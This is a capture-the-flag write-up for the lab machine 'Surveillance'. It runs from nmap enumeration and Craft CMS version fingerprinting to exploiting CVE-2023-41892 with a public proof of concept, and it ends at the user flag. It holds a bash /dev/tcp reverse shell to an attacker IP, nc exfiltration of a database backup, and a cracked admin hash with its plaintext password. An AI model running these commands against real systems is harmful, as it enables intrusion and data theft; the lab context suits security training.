# Surveillance

Difficulty Medium 

## Enumeration

```
nmap --vv -sS -sCV -p- --min-rate 5000 -oX 10.10.11.245.xml 10.10.11.245
```

| Port | Service | Info |
| ---- | ----	 | ---- |
| 22 | ssh | |
| 80 | http | http-title: Did not follow redirect to http://surveillance.htb/ |

Adding the domain to hosts

```
echo '10.10.11.245 surveillance.htb' | sudo tee -a /etc/hosts
```

Footer-Section reveals Versionnumber of CMS. Following the link and selecting the register-tab Security show serveral issues. 
```
<!-- footer section -->
  <section class="footer_section">
    <div class="container">
      <p>
        &copy; <span id="displayYear"></span> All Rights Reserved By
        SURVEILLANCE.HTB</a><br> <b>Powered by <a href="https://github.com/craftcms/cms/tree/4.4.14"/>Craft CMS</a></b>
      </p>
    </div>
  </section>
```

## Foothold

For the Critical issue with the CVE-2023-41892 a poc can be found:

https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226

There are other POC which are similar but haven't worked for me very well.
The main change is at the writePayloadToTempFile Function:
```
 response = requests.post(url, headers=headers, data=data, files=files) 
```

Instead of files=files is a proxy used. So check if you got the right one and not the forked poc. 

Exploit using poc:
```
python3 poctest.py http://surveillance.htb
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Start listener on attacker
```
nc -nlvp 1337
```

Upgrading this webshell 
```
$ bash -c "bash -i >& /dev/tcp/10.10.14.13/1337 0>&1"
```

Copy the backup file surveillance--2023-10-17-202801--v4.4.14.sql.zip (~/html/craft/storage/backups)

Starting listener on attacker machine
```
nc -nlp 1338 > backup.zip
```

Tranfering file using nc from vitcim
```
nc -w 3 10.10.14.13 1338 < surveillance--2023-10-17-202801--v4.4.14.sql.zip
```

In this backup we can find the hash for Matthew:
```
'Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'
```

Cracking the hash, hashcat or just use crackstation.net
```
echo '39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec' > hash.txt

hashcat --identify hash.txt
The following 8 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   1400 | SHA2-256                                                   | Raw Hash
  17400 | SHA3-256                                                   | Raw Hash
  11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian           | Raw Hash
   6900 | GOST R 34.11-94                                            | Raw Hash
  17800 | Keccak-256                                                 | Raw Hash
   1470 | sha256(utf16le($pass))                                     | Raw Hash
  20800 | sha256(md5($pass))                                         | Raw Hash salted and/or iterated
  21400 | sha256(sha256_bin($pass))                                  | Raw Hash salted and/or iterated

hashcat -m 1400 -a 3 hash.txt /usr/share/wordlists/rockyou.txt
....
hashcat -m 1400 -a 3 hash.txt /usr/share/wordlists/rockyou.txt --show
39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec:starcraft122490
```

Login using the credentials we have cracked and get the user-flag.

